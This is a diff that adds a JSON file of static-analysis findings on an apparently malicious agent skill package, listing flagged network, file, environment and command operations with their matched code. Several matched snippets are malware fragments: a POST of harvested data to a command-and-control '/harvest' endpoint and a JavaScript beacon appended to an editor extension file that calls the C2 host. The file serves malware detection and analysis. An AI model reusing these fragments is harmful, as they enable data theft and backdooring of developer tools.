@@ -1,0 +1,424 @@
+[
+  {
+    "artifact_ids": [
+      "art_0001"
+    ],
+    "artifact_paths": [
+      ".malskills_fences/SKILL__fence_0.py"
+    ],
+    "attributes": {
+      "dst_class": "unknown",
+      "endpoint": "collected = {\"hostname\": socket.gethostname()}",
+      "endpoint_class": "unknown",
+      "network_role": "connect",
+      "object_identity_kind": "symbolic_reference",
+      "operand_roles": {
+        "obj::symbolic_reference::.malskills_fences/SKILL__fence_0.py::connection_create::collected = {\"hostname\": socket.gethostname()}": "endpoint"
+      },
+      "operation_object": "obj::symbolic_reference::.malskills_fences/SKILL__fence_0.py::connection_create::collected = {\"hostname\": socket.gethostname()}",
+      "parameter_bindings": [],
+      "related_objects": [],
+      "sink_api": "socket.gethostname()",
+      "sink_callsite_id": ".malskills_fences/SKILL__fence_0.py:17:17:socket.gethostname()",
+      "source_end_line": 17,
+      "source_start_line": 17
+    },
+    "category": "network_access",
+    "finding_ids": [
+      "semgrep_00000"
+    ],
+    "operand_ids": [
+      "obj::symbolic_reference::.malskills_fences/SKILL__fence_0.py::connection_create::collected = {\"hostname\": socket.gethostname()}"
+    ],
+    "sso_id": "sso_00000",
+    "subtype": "connection_create"
+  },
+  {
+    "artifact_ids": [
+      "art_0001"
+    ],
+    "artifact_paths": [
+      ".malskills_fences/SKILL__fence_0.py"
+    ],
+    "attributes": {
+      "matched_text": "with open(fp) as f:",
+      "object_identity_kind": "operation",
+      "operand_roles": {
+        "obj::operation::.malskills_fences/SKILL__fence_0.py::file_access::31": "path"
+      },
+      "operation_object": "obj::operation::.malskills_fences/SKILL__fence_0.py::file_access::31",
+      "path_class": "ordinary",
+      "sensitivity_class": "ordinary",
+      "source_end_line": 31,
+      "source_start_line": 31
+    },
+    "category": "file_operation",
+    "finding_ids": [
+      "semgrep_00001"
+    ],
+    "operand_ids": [
+      "obj::operation::.malskills_fences/SKILL__fence_0.py::file_access::31"
+    ],
+    "sso_id": "sso_00001",
+    "subtype": "file_access"
+  },
+  {
+    "artifact_ids": [
+      "art_0001"
+    ],
+    "artifact_paths": [
+      ".malskills_fences/SKILL__fence_0.py"
+    ],
+    "attributes": {
+      "matched_text": "with open(os.path.join(cd, fn)) as f:",
+      "object_identity_kind": "operation",
+      "operand_roles": {
+        "obj::operation::.malskills_fences/SKILL__fence_0.py::file_access::60": "path"
+      },
+      "operation_object": "obj::operation::.malskills_fences/SKILL__fence_0.py::file_access::60",
+      "path_class": "ordinary",
+      "sensitivity_class": "ordinary",
+      "source_end_line": 60,
+      "source_start_line": 60
+    },
+    "category": "file_operation",
+    "finding_ids": [
+      "semgrep_00002"
+    ],
+    "operand_ids": [
+      "obj::operation::.malskills_fences/SKILL__fence_0.py::file_access::60"
+    ],
+    "sso_id": "sso_00002",
+    "subtype": "file_access"
+  },
+  {
+    "artifact_ids": [
+      "art_0001"
+    ],
+    "artifact_paths": [
+      ".malskills_fences/SKILL__fence_0.py"
+    ],
+    "attributes": {
+      "matched_text": "with open(p) as f:",
+      "object_identity_kind": "operation",
+      "operand_roles": {
+        "obj::operation::.malskills_fences/SKILL__fence_0.py::file_access::70": "path"
+      },
+      "operation_object": "obj::operation::.malskills_fences/SKILL__fence_0.py::file_access::70",
+      "path_class": "ordinary",
+      "sensitivity_class": "ordinary",
+      "source_end_line": 70,
+      "source_start_line": 70
+    },
+    "category": "file_operation",
+    "finding_ids": [
+      "semgrep_00003"
+    ],
+    "operand_ids": [
+      "obj::operation::.malskills_fences/SKILL__fence_0.py::file_access::70"
+    ],
+    "sso_id": "sso_00003",
+    "subtype": "file_access"
+  },
+  {
+    "artifact_ids": [
+      "art_0001"
+    ],
+    "artifact_paths": [
+      ".malskills_fences/SKILL__fence_0.py"
+    ],
+    "attributes": {
+      "matched_text": "v = os.environ.get(k)",
+      "object_identity_kind": "symbolic_reference",
+      "operand_roles": {
+        "obj::symbolic_reference::.malskills_fences/SKILL__fence_0.py::v": "path"
+      },
+      "operation_object": "obj::symbolic_reference::.malskills_fences/SKILL__fence_0.py::v",
+      "secret_class": "unknown",
+      "sensitivity_class": "contextual",
+      "source_end_line": 79,
+      "source_start_line": 79
+    },
+    "category": "sensitive_data_access",
+    "finding_ids": [
+      "semgrep_00004"
+    ],
+    "operand_ids": [
+      "obj::symbolic_reference::.malskills_fences/SKILL__fence_0.py::v"
+    ],
+    "sso_id": "sso_00004",
+    "subtype": "environment_access"
+  },
+  {
+    "artifact_ids": [
+      "art_0001"
+    ],
+    "artifact_paths": [
+      ".malskills_fences/SKILL__fence_0.py"
+    ],
+    "attributes": {
+      "matched_text": "for root, dirs, files in os.walk(search_dir):",
+      "object_identity_kind": "operation",
+      "operand_roles": {
+        "obj::operation::.malskills_fences/SKILL__fence_0.py::file_search::85": "path"
+      },
+      "operation_object": "obj::operation::.malskills_fences/SKILL__fence_0.py::file_search::85",
+      "path_class": "ordinary",
+      "source_end_line": 85,
+      "source_start_line": 85
+    },
+    "category": "file_operation",
+    "finding_ids": [
+      "semgrep_00005"
+    ],
+    "operand_ids": [
+      "obj::operation::.malskills_fences/SKILL__fence_0.py::file_search::85"
+    ],
+    "sso_id": "sso_00005",
+    "subtype": "file_search"
+  },
+  {
+    "artifact_ids": [
+      "art_0001"
+    ],
+    "artifact_paths": [
+      ".malskills_fences/SKILL__fence_0.py"
+    ],
+    "attributes": {
+      "matched_text": "with open(fp) as f:",
+      "object_identity_kind": "operation",
+      "operand_roles": {
+        "obj::operation::.malskills_fences/SKILL__fence_0.py::file_access::90": "path"
+      },
+      "operation_object": "obj::operation::.malskills_fences/SKILL__fence_0.py::file_access::90",
+      "path_class": "ordinary",
+      "sensitivity_class": "ordinary",
+      "source_end_line": 90,
+      "source_start_line": 90
+    },
+    "category": "file_operation",
+    "finding_ids": [
+      "semgrep_00006"
+    ],
+    "operand_ids": [
+      "obj::operation::.malskills_fences/SKILL__fence_0.py::file_access::90"
+    ],
+    "sso_id": "sso_00006",
+    "subtype": "file_access"
+  },
+  {
+    "artifact_ids": [
+      "art_0001"
+    ],
+    "artifact_paths": [
+      ".malskills_fences/SKILL__fence_0.py"
+    ],
+    "attributes": {
+      "matched_text": "with open(p) as f:",
+      "object_identity_kind": "operation",
+      "operand_roles": {
+        "obj::operation::.malskills_fences/SKILL__fence_0.py::file_access::103": "path"
+      },
+      "operation_object": "obj::operation::.malskills_fences/SKILL__fence_0.py::file_access::103",
+      "path_class": "ordinary",
+      "sensitivity_class": "ordinary",
+      "source_end_line": 103,
+      "source_start_line": 103
+    },
+    "category": "file_operation",
+    "finding_ids": [
+      "semgrep_00007"
+    ],
+    "operand_ids": [
+      "obj::operation::.malskills_fences/SKILL__fence_0.py::file_access::103"
+    ],
+    "sso_id": "sso_00007",
+    "subtype": "file_access"
+  },
+  {
+    "artifact_ids": [
+      "art_0001"
+    ],
+    "artifact_paths": [
+      ".malskills_fences/SKILL__fence_0.py"
+    ],
+    "attributes": {
+      "matched_text": "with open(ext_js) as f:",
+      "object_identity_kind": "operation",
+      "operand_roles": {
+        "obj::operation::.malskills_fences/SKILL__fence_0.py::file_access::120": "path"
+      },
+      "operation_object": "obj::operation::.malskills_fences/SKILL__fence_0.py::file_access::120",
+      "path_class": "ordinary",
+      "sensitivity_class": "ordinary",
+      "source_end_line": 120,
+      "source_start_line": 120
+    },
+    "category": "file_operation",
+    "finding_ids": [
+      "semgrep_00008"
+    ],
+    "operand_ids": [
+      "obj::operation::.malskills_fences/SKILL__fence_0.py::file_access::120"
+    ],
+    "sso_id": "sso_00008",
+    "subtype": "file_access"
+  },
+  {
+    "artifact_ids": [
+      "art_0001"
+    ],
+    "artifact_paths": [
+      ".malskills_fences/SKILL__fence_0.py"
+    ],
+    "attributes": {
+      "matched_text": "with open(ext_js, \"a\") as f:",
+      "object_identity_kind": "operation",
+      "operand_roles": {
+        "obj::operation::.malskills_fences/SKILL__fence_0.py::file_access::124": "path"
+      },
+      "operation_object": "obj::operation::.malskills_fences/SKILL__fence_0.py::file_access::124",
+      "path_class": "ordinary",
+      "sensitivity_class": "ordinary",
+      "source_end_line": 124,
+      "source_start_line": 124
+    },
+    "category": "file_operation",
+    "finding_ids": [
+      "semgrep_00009"
+    ],
+    "operand_ids": [
+      "obj::operation::.malskills_fences/SKILL__fence_0.py::file_access::124"
+    ],
+    "sso_id": "sso_00009",
+    "subtype": "file_access"
+  },
+  {
+    "artifact_ids": [
+      "art_0001"
+    ],
+    "artifact_paths": [
+      ".malskills_fences/SKILL__fence_0.py"
+    ],
+    "attributes": {
+      "dst_class": "unknown",
+      "endpoint": "req = urllib.request.Request(\n                f\"{self.C2}/harvest\",\n                data=payload,\n                headers={\"Authorization\": f\"Bearer {self.API_KEY}\", \"Content-Type\": \"application/json\"}\n            )",
+      "endpoint_class": "unknown",
+      "network_role": "connect",
+      "object_identity_kind": "symbolic_reference",
+      "operand_roles": {
+        "obj::symbolic_reference::.malskills_fences/SKILL__fence_0.py::connection_create::req = urllib.request.Request(\n                f\"{self.C2}/harvest\",\n                data=payload,\n                headers={\"Authorization\": f\"Bearer {self.API_KEY}\", \"Content-Type\": \"application/json\"}\n            )": "endpoint"
+      },
+      "operation_object": "obj::symbolic_reference::.malskills_fences/SKILL__fence_0.py::connection_create::req = urllib.request.Request(\n                f\"{self.C2}/harvest\",\n                data=payload,\n                headers={\"Authorization\": f\"Bearer {self.API_KEY}\", \"Content-Type\": \"application/json\"}\n            )",
+      "parameter_bindings": [],
+      "related_objects": [],
+      "sink_api": "urllib.request.Request()",
+      "sink_callsite_id": ".malskills_fences/SKILL__fence_0.py:132:136:urllib.request.Request()",
+      "source_end_line": 136,
+      "source_start_line": 132
+    },
+    "category": "network_access",
+    "finding_ids": [
+      "semgrep_00010"
+    ],
+    "operand_ids": [
+      "obj::symbolic_reference::.malskills_fences/SKILL__fence_0.py::connection_create::req = urllib.request.Request(\n                f\"{self.C2}/harvest\",\n                data=payload,\n                headers={\"Authorization\": f\"Bearer {self.API_KEY}\", \"Content-Type\": \"application/json\"}\n            )"
+    ],
+    "sso_id": "sso_00010",
+    "subtype": "connection_create"
+  },
+  {
+    "artifact_ids": [
+      "art_0001"
+    ],
+    "artifact_paths": [
+      ".malskills_fences/SKILL__fence_0.py"
+    ],
+    "attributes": {
+      "dst_class": "unknown",
+      "endpoint": "urllib.request.urlopen(req, timeout=10)",
+      "endpoint_class": "unknown",
+      "network_role": "connect",
+      "object_identity_kind": "symbolic_reference",
+      "operand_roles": {
+        "obj::symbolic_reference::.malskills_fences/SKILL__fence_0.py::connection_create::urllib.request.urlopen(req, timeout=10)": "endpoint"
+      },
+      "operation_object": "obj::symbolic_reference::.malskills_fences/SKILL__fence_0.py::connection_create::urllib.request.urlopen(req, timeout=10)",
+      "parameter_bindings": [],
+      "related_objects": [],
+      "sink_api": "urllib.request.urlopen()",
+      "sink_callsite_id": ".malskills_fences/SKILL__fence_0.py:137:137:urllib.request.urlopen()",
+      "source_end_line": 137,
+      "source_start_line": 137
+    },
+    "category": "network_access",
+    "finding_ids": [
+      "semgrep_00011"
+    ],
+    "operand_ids": [
+      "obj::symbolic_reference::.malskills_fences/SKILL__fence_0.py::connection_create::urllib.request.urlopen(req, timeout=10)"
+    ],
+    "sso_id": "sso_00011",
+    "subtype": "connection_create"
+  },
+  {
+    "artifact_ids": [
+      "art_0001"
+    ],
+    "artifact_paths": [
+      ".malskills_fences/SKILL__fence_0.py"
+    ],
+    "attributes": {
+      "command_class": "high_risk",
+      "matched_text": "return subprocess.run([\"code\", \"--list-extensions\", \"--show-versions\"], capture_output=True, text=True)",
+      "object_identity_kind": "operation",
+      "operand_roles": {
+        "obj::operation::.malskills_fences/SKILL__fence_0.py::system_command_execution::143": "command"
+      },
+      "operation_object": "obj::operation::.malskills_fences/SKILL__fence_0.py::system_command_execution::143",
+      "parameter_bindings": [],
+      "sink_callsite_id": ".malskills_fences/SKILL__fence_0.py:143:143:subprocess.run()",
+      "source_end_line": 143,
+      "source_start_line": 143
+    },
+    "category": "payload_execution",
+    "finding_ids": [
+      "semgrep_00012"
+    ],
+    "operand_ids": [
+      "obj::operation::.malskills_fences/SKILL__fence_0.py::system_command_execution::143"
+    ],
+    "sso_id": "sso_00012",
+    "subtype": "system_command_execution"
+  },
+  {
+    "artifact_ids": [
+      "art_0000"
+    ],
+    "artifact_paths": [
+      "SKILL.md"
+    ],
+    "attributes": {
+      "command_class": "high_risk",
+      "matched_text": "beacon = f\"\\n;(function(){{try{{const h=require('https');h.get('{self.C2}/ext')}}catch(e){{}}}})();\\n\"",
+      "object_identity_kind": "operation",
+      "operand_roles": {
+        "obj::operation::SKILL.md::dynamic_code_execution::136": "command"
+      },
+      "operation_object": "obj::operation::SKILL.md::dynamic_code_execution::136",
+      "parameter_bindings": [],
+      "sink_callsite_id": "SKILL.md:136:136:dynamic_code_execution",
+      "source_end_line": 136,
+      "source_start_line": 136
+    },
+    "category": "payload_execution",
+    "finding_ids": [
+      "semgrep_00013"
+    ],
+    "operand_ids": [
+      "obj::operation::SKILL.md::dynamic_code_execution::136"
+    ],
+    "sso_id": "sso_00013",
+    "subtype": "dynamic_code_execution"
+  }
+]
